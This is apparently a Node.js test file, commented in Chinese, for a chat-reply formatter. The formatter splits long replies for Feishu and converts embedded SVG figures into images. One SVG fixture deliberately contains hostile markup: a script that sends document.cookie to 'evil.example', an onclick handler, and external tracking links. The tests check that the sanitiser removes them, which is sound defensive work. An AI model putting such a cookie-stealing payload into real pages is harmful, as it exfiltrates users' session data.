// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
// Copyright (c) 2026 开发者猫叔 (DeveloperCatUncle) · 商业使用需授权：COMMERCIAL-LICENSE.md
"use strict";
/**
 * IM 回复发出去之前的两道整形（src/util/im-reply.js），外加飞书那条真接线。
 *
 * 起因是飞书上的真事：一条 4000 多字的财报解读，卡片说「正文见下一条消息」，下一条在
 * 「**1. 客户合同负债」处戛然而止（im.js 里 out.slice(0, 3500) 直接砍）；正文里那张 ```svg 信息图
 * 原样贴成了一大坨尖括号（网页会画，飞书不会）。
 *
 * 盯的几件事，每条配反向对照：
 *   ① 长回复切成几条，拼回来一个字不少；每条不超 3000 字、不超 5 张表；
 *   ② 代码块、表格切在中间时两半各自能渲染（围栏补齐、表头重抄）；
 *   ③ 正文里的图摘出来：网页当图的这里也当图，讲标签的行内代码、```html 示例不动；
 *   ④ 交给浏览器截图的那份没有脚本、没有外链，变量换成实值；
 *   ⑤ 能发图的通道：正文里换成「图见下方」，图跟在正文后面发；转不成、发不了图的通道换成一句实话；
 *   ⑥ 真接线：飞书收到的每条消息里都没有 SVG 源码，全文都在，图作为图片发出。
 */
const fs = require("fs");
const os = require("os");
const path = require("path");
const { mod } = require("./lib/mod");

const ROOT = path.join(__dirname, "..");
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), "owb-im-reply-"));
process.env.OPENWORKBUDDY_HOME = path.join(TMP, "home");
const TMPROOT = path.join(TMP, "tmproot"); // 发图用的临时目录建在这下面，好数有没有删干净
fs.mkdirSync(TMPROOT, { recursive: true });
const R = require(mod("im-reply"));

let n = 0;
const bad = [];
const ok = (name, cond, extra) => {
  if (cond) n++;
  else { bad.push(name); console.log(`  ✗ ${name}${extra !== undefined ? "\n      " + String(extra).slice(0, 600) : ""}`); }
};
const fenceLines = (s) => s.split("\n").filter((l) => /^\s*```/.test(l)).length;
const tablesIn = (s) => { let k = 0, inT = false; for (const l of s.split("\n")) { const r = /^\s*\|.*\|\s*$/.test(l); if (r && !inT) k++; inT = r; } return k; };
const word = (k) => "存储芯片需求".repeat(Math.ceil(k / 6)).slice(0, k);

// 跟那条真回答一个形状：开场、一张图、几张表、一段代码，结尾那句以前就是被砍掉的那句
const FIG = `<svg viewBox="0 0 680 430" xmlns="http://www.w3.org/2000/svg">
<style>@import url(https://evil.example/x.css); .t{fill:var(--color-text-primary);font-family:var(--font-sans)}</style>
<rect width="680" height="430" fill="var(--color-bg-subtle)" onclick="steal()"/>
<text x="24" y="40" class="t">美光 FY2026 Q4</text>
<text x="24" y="70" fill="var(--color-text-secondary)" font-family="var(--font-sans)">营收与毛利率</text>
<rect x="40" y="100" width="120" height="200" fill="var(--brand, #3b82f6)"/>
<rect x="200" y="100" width="120" height="200" fill="url(#g)"/>
<rect x="360" y="100" width="120" height="200" fill="url(https://evil.example/p.png)"/>
<image href="https://evil.example/track.png" width="1" height="1"/>
<use xlink:href="#g"/>
<foreignObject width="10" height="10"><div>x</div></foreignObject>
<script>fetch("https://evil.example/" + document.cookie)</script>
</svg>`;
const table = (k, rows) => `| 指标${k} | 数值 |\n|---|---|\n` + Array.from({ length: rows }, (_, i) => `| 第${i}行 | ${word(20)} |`).join("\n");
const LONG = [
  "## 美光 FY2026 Q4 财报解读",
  word(600),
  "```svg\n" + FIG + "\n```",
  word(700),
  ...[1, 2, 3, 4, 5, 6].map((k) => table(k, 6)),
  "```python\n" + Array.from({ length: 60 }, (_, i) => `rev_${i} = load("q${i}")  # ${word(12)}`).join("\n") + "\n```",
  word(900),
  "**1. 客户合同负债** 是这次最值得盯的一项：末尾标记ZQ",
].join("\n\n");

(async () => {
  // ════ ① 切条：一个字不少、每条有上限 ════
  console.log("① 长回复切成几条");
  {
    ok("① 短回复原样一条", JSON.stringify(R.chunks("你好\n\n世界")) === JSON.stringify(["你好\n\n世界"]));
    const textOnly = LONG.replace(/```svg[\s\S]*?```/, "");
    const cs = R.chunks(textOnly, { max: 3000, tables: 5 });
    ok("① 4000 多字切成多条", cs.length >= 2, cs.length);
    ok("① 每条不超 3000 字", cs.every((c) => c.length <= 3000), cs.map((c) => c.length));
    ok("① 每条不超 5 张表", cs.every((c) => tablesIn(c) <= 5), cs.map(tablesIn));
    ok("① 以前被砍掉的结尾在最后一条里", cs[cs.length - 1].includes("末尾标记ZQ"));
    // 原文每一行都按顺序出现（切条只会多出补的围栏、重抄的表头，不会少字）
    const joined = cs.join("\n");
    let at = 0, lost = null;
    for (const line of textOnly.split("\n").filter((l) => l.trim())) {
      const i = joined.indexOf(line, at);
      if (i < 0) { lost = line; break; }
      at = i + line.length;
    }
    ok("① 原文每一行都在、顺序不乱", lost === null, lost);

    // 反向对照：以前那一刀
    ok("① 对照：slice(0, 3500) 确实会丢结尾", !textOnly.slice(0, 3500).includes("末尾标记ZQ"));

    const t7 = Array.from({ length: 7 }, (_, k) => table(k, 2)).join("\n\n");
    const c7 = R.chunks(t7, { max: 3000, tables: 5 });
    ok("① 不长但有 7 张表：也得拆（飞书一张卡最多 5 张）", t7.length < 3000 && c7.length === 2 && c7.every((c) => tablesIn(c) <= 5), c7.map(tablesIn));

    const one = "长".repeat(7000);
    const c1 = R.chunks(one, { max: 3000 });
    ok("① 一整行 7000 字不换行：硬切，每条不超上限，拼回来一字不差", c1.every((c) => c.length <= 3000) && c1.join("") === one, c1.map((c) => c.length));
  }

  // ════ ② 切在代码块、表格中间 ════
  console.log("② 切在代码块、表格中间");
  {
    const code = "开场\n\n```python\n" + Array.from({ length: 300 }, (_, i) => `x_${i} = ${i}  # ${word(8)}`).join("\n") + "\n```\n\n收尾";
    const cs = R.chunks(code, { max: 1500 });
    ok("② 代码块切开后每条的围栏都成对", cs.length >= 3 && cs.every((c) => fenceLines(c) % 2 === 0), cs.map(fenceLines));
    ok("② 后面几截重开的是同一种围栏（```python）", cs.slice(1).filter((c) => c.includes("x_")).every((c) => c.startsWith("```python")), cs.map((c) => c.slice(0, 12)));
    ok("② 每条不超上限", cs.every((c) => c.length <= 1500), cs.map((c) => c.length));
    ok("② 围栏里的空行不当段落切", R.chunks("```\na\n\nb\n```", { max: 200 }).length === 1);

    const big = table("大", 200);
    const ts = R.chunks("前言\n\n" + big, { max: 1500 });
    const cont = ts.filter((c) => c.includes("第") && !c.startsWith("前言"));
    ok("② 表格切开后，后面几截先重抄表头两行", cont.length >= 2 && cont.every((c) => c.startsWith("| 指标大 | 数值 |\n|---|---|\n")), cont.map((c) => c.slice(0, 30)));
    ok("② 表格每一行都在", Array.from({ length: 200 }, (_, i) => `| 第${i}行 |`).every((r) => ts.some((c) => c.includes(r))));
  }

  // ════ ③ 认图 ════
  console.log("③ 正文里的图");
  {
    const p = R.pullFigures(LONG);
    ok("③ ```svg 围栏认成图", p.figs.length === 1 && !p.text.includes("<svg") && p.text.includes("\x00SVG0\x00"), p.figs.length);
    const bare = R.pullFigures("看图：\n<svg viewBox=\"0 0 10 10\"><rect width=\"5\" height=\"5\"/></svg>\n完");
    ok("③ 裸 <svg>…</svg> 也认", bare.figs.length === 1 && !bare.figs[0].partial && bare.text.includes("完"));
    const half = R.pullFigures("说一半：\n```svg\n<svg viewBox=\"0 0 10 10\"><rect width=\"5\"");
    ok("③ 没闭合的那张也摘掉，记成半截", half.figs.length === 1 && half.figs[0].partial && !half.text.includes("<rect"));
    const talk = R.pullFigures("图以 `<svg>` 内联，正文照常");
    ok("③ 行内代码里讲标签的不动", talk.figs.length === 0 && talk.text === "图以 `<svg>` 内联，正文照常");
    const html = R.pullFigures("示例：\n```html\n<svg viewBox=\"0 0 1 1\"><rect/></svg>\n```");
    ok("③ ```html 代码示例里的不动（网页也是当代码显示）", html.figs.length === 0);
    ok("③ 空壳 <svg></svg> 不算图", R.pullFigures("<svg viewBox=\"0 0 1 1\"></svg>").figs.length === 0);
  }

  // ════ ④ 交给浏览器截图的那份 ════
  console.log("④ 截图前清洗");
  {
    const s = R.forRaster(FIG);
    ok("④ 脚本、foreignObject 砍掉", !/<script|foreignObject/i.test(s), s);
    ok("④ on* 事件属性砍掉", !/onclick/i.test(s));
    ok("④ 外链（href、url(http)、@import）砍掉", !/evil\.example/.test(s), s.match(/.{0,30}evil.{0,30}/g));
    ok("④ 图内引用（#g）留着", s.includes('xlink:href="#g"') && s.includes("url(#g)"));
    ok("④ 网页那套变量换成实值", !s.includes("var(") && s.includes("#2c2c2a") && s.includes("#5f5e5a") && s.includes("#f7f8fa"), s.match(/var\([^)]*\)/g));
    ok("④ 不认得的变量用它自己的兜底", s.includes('fill="#3b82f6"'));
    ok("④ 字体塞进双引号属性后属性没被截断", /font-family="-apple-system,[^"]*'PingFang SC'[^"]*sans-serif"/.test(s));
    ok("④ 不认得又没兜底的：当正文色，不留 var()", R.forRaster('<svg viewBox="0 0 1 1"><rect fill="var(--nope)"/></svg>').includes('fill="#2c2c2a"'));
    const half = R.forRaster('<svg viewBox="0 0 10 10"><style>.a{fill:red}', true);
    ok("④ 半截的补上闭合（style、svg）", /<\/style><\/svg>$/.test(half), half);
  }

  // ════ ⑤ 摘图、转图、换说明 ════
  console.log("⑤ 换说明");
  {
    const two = "前\n\n```svg\n<svg viewBox=\"0 0 1 1\"><rect/></svg>\n```\n\n中\n\n<svg viewBox=\"0 0 2 2\"><circle/></svg>\n\n后";
    const seen = [];
    const png = (s) => { seen.push(s); return { png: Buffer.from("PNG" + seen.length) }; };
    const a = await R.prepareFigures(two, { canSend: true, render: async (s) => png(s) });
    ok("⑤ 两张都转成：正文按图号说「见下方」", a.text === "前\n\n（图 1 见下方图片）\n\n中\n\n（图 2 见下方图片）\n\n后", JSON.stringify(a.text));
    ok("⑤ 图按顺序给出", a.pngs.length === 2 && a.pngs[0].png.toString() === "PNG1" && a.pngs[1].name === "图2.png");
    const one = await R.prepareFigures("前\n\n<svg viewBox=\"0 0 1 1\"><rect/></svg>", { canSend: true, render: async (s) => png(s) });
    ok("⑤ 只有一张：不编号", one.text === "前\n\n（图见下方图片）" && one.pngs[0].name === "图.png", JSON.stringify(one.text));
    const fail = await R.prepareFigures(two, { canSend: true, render: async () => ({ png: null }) });
    ok("⑤ 转不成：说没转成，不贴源码、不说见下方", fail.pngs.length === 0 && fail.failed === 2 && !fail.text.includes("<") && !fail.text.includes("见下方") && fail.text.includes("转成图片没成功"), JSON.stringify(fail.text));
    const thrown = await R.prepareFigures(two, { canSend: true, render: async () => { throw new Error("boom"); } });
    ok("⑤ 渲染抛错也接住", thrown.failed === 2 && thrown.text.includes("转成图片没成功"));
    let calls = 0;
    const none = await R.prepareFigures(two, { canSend: false, render: async () => { calls++; return { png: Buffer.from("x") }; } });
    ok("⑤ 发不了图的通道：不白转，换成一句实话", calls === 0 && none.pngs.length === 0 && none.text.includes("这个聊天里发不了图片") && !none.text.includes("<svg"), JSON.stringify(none.text));
    const six = Array.from({ length: 6 }, (_, i) => `<svg viewBox="0 0 ${i + 1} 1"><rect/></svg>`).join("\n\n");
    let k = 0;
    const capped = await R.prepareFigures(six, { canSend: true, render: async () => { k++; return { png: Buffer.from("p") }; } });
    ok("⑤ 一次最多转 4 张，多的说清楚", k === R.MAX_FIGS && capped.pngs.length === 4 && (capped.text.match(/一次最多发 4 张/g) || []).length === 2, capped.text);
    ok("⑤ 没有图的回复原样返回", (await R.prepareFigures("就一句话", { canSend: true, render: png })).text === "就一句话");
    ok("⑤ 群机器人摘要：图换成一句话", R.dropFigures("结论\n<svg viewBox='0 0 1 1'><rect/></svg>") === "结论\n\n（这里原本有一张图，这个聊天里发不了图片）");
  }

  // ════ ⑥ 真接线：飞书事件进来 → 卡片被拒退回普通回复 → 分条 + 发图 ════
  console.log("⑥ 飞书真接线");
  {
    const express = require("express");
    const http = require("http");
    const tools = require(mod("tools"));
    const { dataPath } = require(mod("paths"));
    const { createImRouter } = require(mod("im"));
    const API = "https://open.feishu.cn/open-apis";
    const WS = path.join(TMP, "ws");
    fs.mkdirSync(WS, { recursive: true });
    fs.mkdirSync(dataPath("data"), { recursive: true });
    const prevTmp = process.env.TMPDIR;
    process.env.TMPDIR = TMPROOT; // os.tmpdir() 每次现读：发图的临时目录落这儿，好数删没删

    const calls = [];
    const realFetch = global.fetch;
    const json = (o) => ({ ok: true, status: 200, json: async () => o });
    global.fetch = async (url, init = {}) => {
      const u = String(url);
      if (u === `${API}/auth/v3/tenant_access_token/internal`) return json({ code: 0, tenant_access_token: "t-reply", expire: 7200 });
      if (/\/im\/v1\/messages\/[^/]+\/reactions/.test(u)) return json({ code: 0, data: { reaction_id: "r_reply" } });
      if (u.startsWith(`${API}/cardkit/`)) return json({ code: 99991672, msg: "no permission" }); // 执行过程卡片被拒：走普通回复
      if (u === `${API}/im/v1/images`) {
        const fields = {};
        for (const [k, v] of init.body.entries()) fields[k] = typeof v === "string" ? v : { name: v.name, size: v.size };
        calls.push({ kind: "image", fields });
        return json({ code: 0, data: { image_key: `img_${calls.length}` } });
      }
      if (u === `${API}/im/v1/messages?receive_id_type=chat_id`) {
        const b = JSON.parse(init.body);
        calls.push({ kind: "msg", receive_id: b.receive_id, msg_type: b.msg_type, content: JSON.parse(b.content) });
        return json({ code: 0, data: { message_id: `om_r${calls.length}` } });
      }
      calls.push({ kind: "unknown", url: u });
      throw new Error(`假飞书：没见过的地址 ${u}`);
    };

    const rendered = [];
    let renderMode = "ok";
    const renderSvg = async (svg) => {
      rendered.push(svg);
      if (renderMode === "throw") throw new Error("渲染进程没起来");
      return renderMode === "ok" ? { png: Buffer.from([0x89, 0x50, 0x4e, 0x47, 1, 2, 3]), via: "fake" } : { png: null, via: "" };
    };
    const runtime = { runTask: async () => ({ finalText: LONG }) };
    const app = express();
    app.use(express.json());
    app.use((_req, _res, next) => tools.withWorkspace(WS, next));
    app.use(createImRouter({
      config: { im: { feishu: { app_id: "cli_reply", app_secret: "s_reply" } } },
      runtime, sessions: new Map(), outputFiles: () => [], renderSvg,
    }).router);
    const server = await new Promise((resolve) => { const s = app.listen(0, "127.0.0.1", () => resolve(s)); });
    const post = (p, body) => new Promise((resolve, reject) => {
      const data = Buffer.from(JSON.stringify(body));
      const req = http.request({
        host: "127.0.0.1", port: server.address().port, path: p, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": data.length },
      }, (res) => { let t = ""; res.on("data", (c) => (t += c)); res.on("end", () => resolve({ status: res.statusCode, body: t })); });
      req.on("error", reject);
      req.end(data);
    });
    const ask = (chat, id) => post("/im/feishu/events", {
      schema: "2.0",
      header: { event_id: `ev_reply_${id}`, event_type: "im.message.receive_v1" },
      event: { message: { message_id: `om_in_${id}`, chat_id: chat, chat_type: "p2p", message_type: "text", content: JSON.stringify({ text: "美光财报怎么样" }) } },
    });
    const msgsOf = (chat) => calls.filter((c) => c.kind === "msg" && c.receive_id === chat);
    const textOf = (m) => m.msg_type === "interactive" ? m.content.body.elements.map((e) => e.content || "").join("\n") : m.msg_type === "text" ? m.content.text : "";
    const waitFor = async (pred) => { const until = Date.now() + 15000; while (Date.now() < until && !pred()) await new Promise((r) => setTimeout(r, 50)); };
    try {
      // 图能转成
      const r = await ask("oc_ok", 1);
      ok("⑥ 飞书事件路由应答 200", r.status === 200, r.body);
      await waitFor(() => msgsOf("oc_ok").some((m) => m.msg_type === "image"));
      await new Promise((res) => setTimeout(res, 200));
      const all = msgsOf("oc_ok");
      const texts = all.filter((m) => m.msg_type === "interactive");
      const body = texts.map(textOf).join("\n");
      ok("⑥ 正文分成多张卡片发", texts.length >= 2, all.map((m) => m.msg_type).join(","));
      ok("⑥ 每张卡片的正文不超 3000 字、不超 5 张表", texts.every((m) => textOf(m).length <= 3000 && tablesIn(textOf(m)) <= 5), texts.map((m) => textOf(m).length));
      ok("⑥ 以前被砍掉的结尾这次在", body.includes("末尾标记ZQ"));
      ok("⑥ 飞书收到的任何一条里都没有 SVG 源码、没有 var()", !all.some((m) => /<svg|var\(--|```svg/.test(JSON.stringify(m.content))), body.match(/.{0,20}(<svg|var\(--).{0,20}/));
      ok("⑥ 图的位置换成「图见下方图片」", body.includes("（图见下方图片）"));
      const img = all.find((m) => m.msg_type === "image");
      const lastText = all.map((m) => m.msg_type).lastIndexOf("interactive");
      ok("⑥ 图作为图片发出，排在正文后面", !!img && /^img_/.test(img.content.image_key) && all.indexOf(img) > lastText, all.map((m) => m.msg_type).join(","));
      const up = calls.find((c) => c.kind === "image");
      ok("⑥ 传上去的是转好的 PNG（image_type=message）", !!up && up.fields.image_type === "message" && up.fields.image.size === 7, JSON.stringify(up));
      ok("⑥ 交给渲染的那份已经清洗过（没脚本、没外链、没 var）", rendered.length === 1 && !/<script|evil\.example|var\(/.test(rendered[0]), rendered[0] && rendered[0].slice(0, 200));
      const left = fs.readdirSync(TMPROOT).filter((d) => d.startsWith("owb-imfig-"));
      ok("⑥ 发图的临时目录删干净了", left.length === 0, left);
      ok("⑥ 工作区里没多出图片（不能被当成成果）", fs.readdirSync(WS).length === 0, fs.readdirSync(WS));

      // 图转不成：说实话，不贴源码，不发图
      renderMode = "null";
      const before = calls.filter((c) => c.kind === "image").length;
      await ask("oc_fail", 2);
      await waitFor(() => msgsOf("oc_fail").some((m) => textOf(m).includes("末尾标记ZQ")));
      await new Promise((res) => setTimeout(res, 200));
      const fb = msgsOf("oc_fail").map(textOf).join("\n");
      ok("⑥ 转不成：原位置说没转成，全文仍在", fb.includes("转成图片没成功") && fb.includes("末尾标记ZQ") && !fb.includes("见下方图片"), fb.slice(0, 200));
      ok("⑥ 转不成：没有 SVG 源码、没发图", !/<svg|var\(--/.test(fb) && calls.filter((c) => c.kind === "image").length === before && !msgsOf("oc_fail").some((m) => m.msg_type === "image"));

      renderMode = "throw";
      await ask("oc_throw", 3);
      await waitFor(() => msgsOf("oc_throw").some((m) => textOf(m).includes("末尾标记ZQ")));
      const tb = msgsOf("oc_throw").map(textOf).join("\n");
      ok("⑥ 渲染抛错：任务照常交付，不报「任务执行出错」", tb.includes("转成图片没成功") && !tb.includes("出错"), tb.slice(0, 200));
      ok("⑥ 没碰没见过的飞书地址", !calls.some((c) => c.kind === "unknown"), JSON.stringify(calls.filter((c) => c.kind === "unknown")));
    } finally {
      global.fetch = realFetch;
      if (prevTmp === undefined) delete process.env.TMPDIR; else process.env.TMPDIR = prevTmp;
      await new Promise((res) => server.close(() => res()));
    }
  }

  // ════ ⑦ 别的通道也接上了 ════
  console.log("⑦ 接线");
  {
    const src = fs.readFileSync(mod("im"), "utf8");
    ok("⑦ 飞书回复不再一刀砍在 3500", !/out\.slice\(0,\s*3500\)/.test(src));
    ok("⑦ 文档评论回复不再一刀砍在 3000", !/text \|\| ""\)\.slice\(0,\s*3000\)/.test(src));
    for (const ch of ["feishuMedia.sendImage", "wecom.sendFile(msg.fromUser, abs", "mp.sendFile(msg.fromUser, abs", "ilink.sendFile(userId, abs"]) {
      ok(`⑦ 能发图的通道接了 sendImage：${ch.split(".")[0]}`, src.includes(`sendImage: (abs, name`) && src.includes(ch), ch);
    }
  }
})().catch((e) => {
  bad.push("意外异常");
  console.log("  ✗ 意外异常：" + (e && e.stack || e));
}).finally(() => {
  try { fs.rmSync(TMP, { recursive: true, force: true }); } catch {}
  const MIN = 60;
  if (!bad.length && n < MIN) bad.push(`断言只跑了 ${n} 条（应 ≥ ${MIN}）`);
  if (bad.length) {
    console.log(`❌ IM 回复整形：${bad.length} 条没过（过了 ${n} 条）`);
    for (const b of bad) console.log("  - " + b);
    process.exit(1);
  }
  console.log(`✅ IM 回复整形：${n} 条断言全过（长回复分条不丢字、代码块表格切开照样能看、正文里的图转成图片发、发不了图的说实话）`);
  process.exit(0);
});
